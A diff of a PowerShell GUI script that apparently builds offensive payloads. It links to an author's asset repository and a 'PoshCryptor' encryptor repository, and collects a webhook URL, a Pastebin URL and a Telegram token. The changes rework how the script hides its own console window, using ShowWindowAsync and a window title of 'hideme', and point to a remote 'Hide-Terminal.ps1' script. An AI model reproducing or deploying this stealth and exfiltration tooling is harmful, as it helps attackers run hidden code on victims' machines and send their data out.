@@ -27,9 +27,13 @@ if ($NCurl.Length -eq 0){$NCurl = "192.168.0.1"} # Change this to open GUI with 
 
 $hidewindow = 1
 If ($HideWindow -gt 0){
-$Import = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
-add-type -name win -member $Import -namespace native;
-[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);
+$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
+$Type = Add-Type -Member $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
+$hwnd = (Get-Process -PID $pid).MainWindowHandle
+$Host.UI.RawUI.WindowTitle = 'hideme'
+$Proc = (Get-Process | Where-Object {$_.MainWindowTitle -eq 'hideme'})
+$hwnd = $Proc.MainWindowHandle
+$Type::ShowWindowAsync($hwnd, 0)
 }
 
 $imageUrl = "https://i.ibb.co/ZGrt8qb/b-min.png"
@@ -215,7 +219,7 @@ $startButton.Add_Click({
     Add-OutputBoxLine -Outfeed "$selectedItem Selected"
     $BaseURL = "https://raw.githubusercontent.com/beigeworm/assets/main/master"
     $PoshcryptURL = "https://raw.githubusercontent.com/beigeworm/PoshCryptor/main"
-    $HideURL = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Hide-Powershell-Console.ps1"
+    $HideURL = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Hide-Terminal.ps1"
     $hookurl = $WebhookInput.Text
     $ghurl = $PastebinInput.Text
     $tg = $TGTokenInput.Text
